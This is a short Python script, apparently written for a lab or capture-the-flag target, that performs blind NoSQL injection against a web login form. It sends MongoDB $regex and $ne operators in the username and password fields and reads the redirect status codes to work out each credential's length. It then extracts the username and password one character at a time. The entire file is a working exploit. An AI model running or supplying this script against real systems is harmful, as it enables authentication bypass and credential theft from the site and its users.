#!/usr/bin/python3

import requests
import string
import sys


if len(sys.argv) < 2:
	print("Usage: python3 {} <login URL>" .format(sys.argv[0]))
	exit()


chars = string.ascii_letters+string.digits + string.printable
#chars = "abcdefghijklmnopqrstuvwxyz123456789" 
url = sys.argv[1]

#find length of username
digit = 0
while True:	
	digit = digit + 1
	r = requests.post(url, data={"username[$regex]":".{"+str(digit)+"}", "password[$ne]":"toto", "login":"login"}, allow_redirects=False)
	if r.status_code == 200:
		finaldigit = digit-1
		print("\nUsername length: {}" .format(finaldigit))
		break

#get username
username = ''
for i in range(finaldigit):
	for c in chars:
		r = requests.post(url, data={"username[$regex]":"^{}{}" .format(username,c), "password[$ne]":"toto", "login":"login"}, allow_redirects=False)
		#print(c + str(r.status_code))
		if r.status_code == 302:
		#if "Under Plantation" in r.text:
			username = username + c
			print("username: {}            " .format(username), end="\r")
			break

print("\n")


#find length of password
digits = 0
while True:	
	digits = digits + 1
	r = requests.post(url, data={"username":username, "password[$regex]":".{"+str(digits)+"}",  "login":"login"}, allow_redirects=False)
	if r.status_code == 200:
		finaldig = digits -1
		print("\nPassword length: {}" .format(finaldig))
		break

#get password
pwd = ''
for i in range(finaldig):
	for c in chars:
		if c not in ['*','+','.','?','|', '{']:
			r = requests.post(url, data={"username":username, "password[$regex]":"^{}{}" .format(pwd,c),  "login":"login"}, allow_redirects=False)
			#print(c + str(r.status_code))
			if r.status_code == 302:
				pwd = pwd + c
				print("Password: {}            " .format(pwd), end="\r")
				break


print("\n")
exit()
